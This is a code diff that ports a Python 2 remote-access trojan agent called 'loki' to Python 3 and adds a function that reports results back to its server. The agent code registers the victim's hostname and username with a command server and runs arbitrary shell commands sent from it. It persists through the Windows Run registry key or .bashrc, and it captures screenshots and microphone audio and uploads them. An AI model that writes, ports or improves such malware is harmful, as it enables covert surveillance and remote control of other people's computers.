@@ -1,8 +1,13 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 # coding: utf-8
 import ctypes
-import geopy
-from geopy.geocoders import Nominatim
+try:
+    import geopy
+    from geopy.geocoders import Nominatim
+except ImportError:
+    print("geopy not available - geolocation disabled")
+    geopy = None
+    Nominatim = None
 import json
 import requests
 import time
@@ -14,30 +19,51 @@ import sys
 import traceback
 import threading
 import uuid
-import StringIO
+import io
 import zipfile
 import tempfile
 import socket
 import getpass
 import argparse
-import pyaudio
-import wave
-from termcolor import colored
+try:
+    import pyaudio
+    import wave
+except ImportError:
+    print("PyAudio not available - audio recording disabled")
+    pyaudio = None
+    wave = None
+try:
+    from termcolor import colored
+except ImportError:
+    print("termcolor not available - colored output disabled")
+    colored = None
 import base64
 import sys, socket, select
-from Crypto.Cipher import AES
+try:
+    from Crypto.Cipher import AES
+except ImportError:
+    print("PyCrypto not available - encryption disabled")
+    AES = None
 import hashlib
 import signal
-from pygeocoder import Geocoder
+try:
+    from pygeocoder import Geocoder
+except (ImportError, AttributeError):
+    print("PyGeocoder not available - using alternative geolocation")
+    Geocoder = None
 
 
 
 
 
-if os.name == 'nt':
-    from PIL import ImageGrab
-else:
-    import pyscreenshot as ImageGrab
+try:
+    if os.name == 'nt':
+        from PIL import ImageGrab
+    else:
+        import pyscreenshot as ImageGrab
+except ImportError:
+    print("Screenshot libraries not available - screenshot disabled")
+    ImageGrab = None
 
 import config
 
@@ -112,6 +138,10 @@ class Agent(object):
             json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
         return req.text
 
+    def report(self, output):
+        """ Report output to the server """
+        requests.post(config.SERVER + '/api/' + self.uid + '/report', data={'output': output})
+
     def send_output(self, output, newlines=True):
         """ Send console output to server """
         if self.silent:
@@ -134,7 +164,7 @@ class Agent(object):
     def runcmd(self, cmd):
         """ Runs a shell command and returns its output """
         try:
-            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             out, err = proc.communicate()
             output = (out + err)
             self.send_output(output)
@@ -144,10 +174,10 @@ class Agent(object):
     @threaded
     def python(self, command_or_file):
         """ Runs a python command or a python file and returns the output """
-        new_stdout = StringIO.StringIO()
+        new_stdout = io.StringIO()
         old_stdout = sys.stdout
         sys.stdout = new_stdout
-        new_stderr = StringIO.StringIO()
+        new_stderr = io.StringIO()
         old_stderr = sys.stderr
         sys.stderr = new_stderr
         if os.path.exists(command_or_file):
@@ -231,7 +261,7 @@ class Agent(object):
                 os.makedirs(persist_dir)
             agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
             shutil.copyfile(sys.executable, agent_path)
-            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v loki /t REG_SZ /d \"%s\"" % agent_path
+            cmd = r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v loki /t REG_SZ /d \"%s\"" % agent_path
             subprocess.Popen(cmd, shell=True)
         self.send_output('[+] Agent installed.')
 
@@ -247,9 +277,9 @@ class Agent(object):
             os.system("grep -v .loki .bashrc > .bashrc.tmp;mv .bashrc.tmp .bashrc")
         elif platform.system() == 'Windows':
             persist_dir = os.path.join(os.getenv('USERPROFILE'), 'loki')
-            cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v loki"
+            cmd = r"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v loki"
             subprocess.Popen(cmd, shell=True)
-            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v loki /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (persist_dir, persist_dir)
+            cmd = r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v loki /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (persist_dir, persist_dir)
             subprocess.Popen(cmd, shell=True)
         self.send_output('[+] Agent removed successfully.')
 
@@ -284,53 +314,64 @@ class Agent(object):
     @threaded
     def screenshot(self):
         """ Takes a screenshot and uploads it to the server"""
-        screenshot = ImageGrab.grab()
-        tmp_file = tempfile.NamedTemporaryFile()
-        screenshot_file = tmp_file.name + ".png"
-        tmp_file.close()
-        screenshot.save(screenshot_file)
-        self.upload(screenshot_file)
-        self.send_output(screenshot_file)
+        if ImageGrab is None:
+            self.send_output("[!] Screenshot libraries not available - screenshot disabled")
+            return
+        
+        try:
+            screenshot = ImageGrab.grab()
+            tmp_file = tempfile.NamedTemporaryFile()
+            screenshot_file = tmp_file.name + ".png"
+            tmp_file.close()
+            screenshot.save(screenshot_file)
+            self.upload(screenshot_file)
+            self.send_output(screenshot_file)
+        except Exception as exc:
+            self.send_output(traceback.format_exc())
 
     @threaded
     def record(self, time, channel, CHUNK, RATE):
+        if pyaudio is None or wave is None:
+            self.send_output("[!] PyAudio not available - audio recording disabled")
+            return
 
+        try:
+            FORMAT = pyaudio.paInt16
+            tmp_file = tempfile.NamedTemporaryFile()
+            WAVE_OUTPUT_FILENAME = tmp_file.name + ".wav"
 
-        FORMAT = pyaudio.paInt16
-        tmp_file = tempfile.NamedTemporaryFile()
-        WAVE_OUTPUT_FILENAME = tmp_file.name + ".wav"
+            p = pyaudio.PyAudio()
 
-        p = pyaudio.PyAudio()
+            stream = p.open(format=FORMAT,
+                            channels= int (channel),
+                            rate= int (RATE),
+                            input=True,
+                            frames_per_buffer= int (CHUNK))
 
-        stream = p.open(format=FORMAT,
-                        channels= int (channel),
-                        rate= int (RATE),
-                        input=True,
-                        frames_per_buffer= int (CHUNK))
+            self.send_output("* recording")
 
-        self.send_output("* recording")
+            frames = []
 
-        frames = []
+            for i in range(0, int(int (RATE) / int (CHUNK) * int (time))):
+                data = stream.read(int (CHUNK))
+                frames.append(data)
 
-        for i in range(0, int(int (RATE) / int (CHUNK) * int (time))):
-            data = stream.read(int (CHUNK))
-            frames.append(data)
+            self.send_output("* done recording")
 
-        self.send_output("* done recording")
+            stream.stop_stream()
+            stream.close()
+            p.terminate()
 
-
-        stream.stop_stream()
-        stream.close()
-        p.terminate()
-
-        wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
-        wf.setnchannels(int (channel))
-        wf.setsampwidth(p.get_sample_size(FORMAT))
-        wf.setframerate(int (RATE))
-        wf.writeframes(b''.join(frames))
-        wf.close()
-        self.upload(WAVE_OUTPUT_FILENAME)
-        self.send_output(WAVE_OUTPUT_FILENAME)
+            wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
+            wf.setnchannels(int (channel))
+            wf.setsampwidth(p.get_sample_size(FORMAT))
+            wf.setframerate(int (RATE))
+            wf.writeframes(b''.join(frames))
+            wf.close()
+            self.upload(WAVE_OUTPUT_FILENAME)
+            self.send_output(WAVE_OUTPUT_FILENAME)
+        except Exception as exc:
+            self.send_output(traceback.format_exc())
 
     def geolocalisation(self):
         from geopy.geocoders import Nominatim
